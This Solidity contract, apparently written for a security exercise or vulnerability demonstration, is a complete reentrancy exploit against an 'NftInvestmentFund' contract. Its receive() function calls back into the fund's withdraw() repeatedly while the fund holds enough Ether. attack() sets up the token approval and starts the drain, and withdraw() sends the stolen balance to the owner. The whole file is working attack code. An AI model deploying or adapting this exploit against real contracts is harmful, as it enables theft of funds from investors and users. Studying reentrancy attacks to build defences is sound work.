// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import { NftInvestmentFund } from "./NftInvestmentFund.sol";
import { FundToken } from "./FundToken.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract MallorysMaliciousMisappropriation is Ownable {
	NftInvestmentFund public nftInvestmentFund;

	error InvestmentFundNotEnded();
	error FailedToSendEther();

	constructor(address payable _nftInvestmentFundAddress) Ownable(msg.sender) {
		nftInvestmentFund = NftInvestmentFund(_nftInvestmentFundAddress);
	}

	// Receive is called when the contract receives Ether
	// solhint-disable-next-line no-complex-fallback
	receive() external payable {
		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
		uint256 withdrawAmount = (nftInvestmentFund.balanceAtEnd() / nftInvestmentFund.fundTokensAtEnd()) *
			fundToken.balanceOf(address(this));

		// The attack
		if (address(nftInvestmentFund).balance >= withdrawAmount) {
			nftInvestmentFund.withdraw();
		}
	}

	function attack() external onlyOwner {
		if (!nftInvestmentFund.ended()) revert InvestmentFundNotEnded();

		FundToken fundToken = FundToken(nftInvestmentFund.fundToken());
		fundToken.approve(address(nftInvestmentFund), fundToken.balanceOf(address(this)));

		nftInvestmentFund.withdraw();
	}

	function withdraw() external onlyOwner {
		(bool sent, ) = payable(msg.sender).call{ value: address(this).balance }("");
		if (!sent) revert FailedToSendEther();
	}
}
